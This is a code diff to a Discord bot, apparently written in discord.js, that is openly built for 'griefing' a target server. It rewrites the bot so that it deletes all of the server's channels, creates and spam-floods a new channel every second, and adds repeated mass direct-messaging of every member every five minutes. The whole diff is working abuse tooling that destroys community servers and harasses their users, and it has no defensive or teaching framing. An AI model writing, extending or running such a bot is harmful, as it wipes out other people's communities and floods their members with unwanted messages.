@@ -10,7 +10,8 @@ const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers
   ]
 });
 
@@ -26,6 +27,7 @@ const config = {
 // Track if the griefing process is active
 let isGriefing = false;
 let spamIntervals = new Map(); // Store intervals for each channel
+let createdChannels = []; // Track created channels
 
 client.once('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
@@ -41,7 +43,7 @@ client.on('messageCreate', async message => {
     }
     
     isGriefing = true;
-    message.channel.send('Starting maximum destruction mode...');
+    message.channel.send('Starting simultaneous destruction mode...');
     
     // Get the target server
     const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
@@ -52,8 +54,8 @@ client.on('messageCreate', async message => {
       return;
     }
     
-    // Start the continuous griefing process
-    startMaximumDestruction(guild);
+    // Start the simultaneous destruction process
+    startSimultaneousDestruction(guild);
   }
   
   // Command to stop griefing
@@ -68,20 +70,14 @@ client.on('messageCreate', async message => {
   }
 });
 
-async function startMaximumDestruction(guild) {
+async function startSimultaneousDestruction(guild) {
   try {
-    // Delete all existing channels super fast
-    await deleteAllChannelsFast(guild);
+    // Start all processes simultaneously
+    deleteAllChannelsFast(guild);
+    createAndSpamChannels(guild);
+    dmAllMembers(guild);
     
-    // Create maximum number of channels (500 is Discord's limit)
-    const channels = await createMaxChannels(guild, 500);
-    
-    // Start spamming in each channel at maximum speed
-    for (const channel of channels) {
-      startAggressiveSpam(channel);
-    }
-    
-    console.log(`Started aggressive spamming in ${channels.length} channels`);
+    console.log('Started all destruction processes simultaneously');
   } catch (error) {
     console.error('Error during destruction:', error);
   }
@@ -109,48 +105,50 @@ async function deleteAllChannelsFast(guild) {
   console.log('All channels deleted');
 }
 
-async function createMaxChannels(guild, maxChannels) {
-  console.log(`Creating maximum ${maxChannels} channels...`);
-  const channels = [];
+async function createAndSpamChannels(guild) {
+  console.log('Starting continuous channel creation and spam...');
   
-  // Create channels in batches to optimize speed
-  const batchSize = 10;
-  let created = 0;
-  
-  while (created < maxChannels) {
-    const batch = [];
-    const currentBatchSize = Math.min(batchSize, maxChannels - created);
-    
-    for (let i = 0; i < currentBatchSize; i++) {
-      batch.push(
-        guild.channels.create({
-          name: `${config.channelName}-${created + i + 1}`,
-          type: 0, // Text channel
-          permissionOverwrites: [
-            {
-              id: guild.id,
-              allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
-            }
-          ]
-        }).then(channel => {
-          channels.push(channel);
-          console.log(`Created channel: ${channel.name}`);
-          return channel;
-        }).catch(error => {
-          console.error(`Failed to create channel:`, error);
-        })
-      );
+  // Create channels continuously
+  const createInterval = setInterval(async () => {
+    if (!isGriefing) {
+      clearInterval(createInterval);
+      return;
     }
     
-    // Wait for the current batch to complete
-    await Promise.all(batch);
-    created += currentBatchSize;
-    
-    // Small delay between batches to avoid rate limiting
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
-  
-  return channels;
+    try {
+      // Create a new channel
+      const channel = await guild.channels.create({
+        name: `${config.channelName}-${Date.now()}-${Math.random().toString(36).substring(7)}`,
+        type: 0, // Text channel
+        permissionOverwrites: [
+          {
+            id: guild.id,
+            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
+          }
+        ]
+      });
+      
+      createdChannels.push(channel);
+      console.log(`Created channel: ${channel.name}`);
+      
+      // Start spamming in this new channel immediately
+      startAggressiveSpam(channel);
+      
+      // If we have too many channels, remove the oldest ones
+      if (createdChannels.length > 500) {
+        const oldChannel = createdChannels.shift();
+        try {
+          await oldChannel.delete();
+          clearInterval(spamIntervals.get(oldChannel.id));
+          spamIntervals.delete(oldChannel.id);
+        } catch (error) {
+          console.error(`Failed to delete old channel:`, error);
+        }
+      }
+    } catch (error) {
+      console.error(`Failed to create channel:`, error);
+    }
+  }, 1000); // Create a new channel every second
 }
 
 function startAggressiveSpam(channel) {
@@ -173,12 +171,68 @@ function startAggressiveSpam(channel) {
   spamIntervals.set(channel.id, interval);
 }
 
+async function dmAllMembers(guild) {
+  console.log('Starting to DM all members...');
+  
+  try {
+    // Fetch all members
+    const members = await guild.members.fetch();
+    
+    // DM each member
+    for (const [id, member] of members) {
+      if (!isGriefing) break;
+      
+      try {
+        await member.send(config.messageContent);
+        console.log(`DMed ${member.user.tag}`);
+        // Small delay to avoid rate limiting
+        await new Promise(resolve => setTimeout(resolve, 500));
+      } catch (error) {
+        console.error(`Failed to DM ${member.user.tag}:`, error);
+      }
+    }
+    
+    // After DMing everyone once, start DMing everyone again periodically
+    const dmInterval = setInterval(async () => {
+      if (!isGriefing) {
+        clearInterval(dmInterval);
+        return;
+      }
+      
+      try {
+        // Fetch all members again
+        const members = await guild.members.fetch();
+        
+        // DM each member
+        for (const [id, member] of members) {
+          if (!isGriefing) break;
+          
+          try {
+            await member.send(config.messageContent);
+            console.log(`DMed ${member.user.tag}`);
+            // Small delay to avoid rate limiting
+            await new Promise(resolve => setTimeout(resolve, 500));
+          } catch (error) {
+            console.error(`Failed to DM ${member.user.tag}:`, error);
+          }
+        }
+      } catch (error) {
+        console.error('Error during periodic DM:', error);
+      }
+    }, 300000); // DM everyone every 5 minutes
+    
+  } catch (error) {
+    console.error('Error during initial DM:', error);
+  }
+}
+
 function stopAllSpam() {
   // Clear all spam intervals
   for (const [channelId, interval] of spamIntervals) {
     clearInterval(interval);
   }
   spamIntervals.clear();
+  createdChannels = [];
 }
 
 // Login to Discord with your bot token
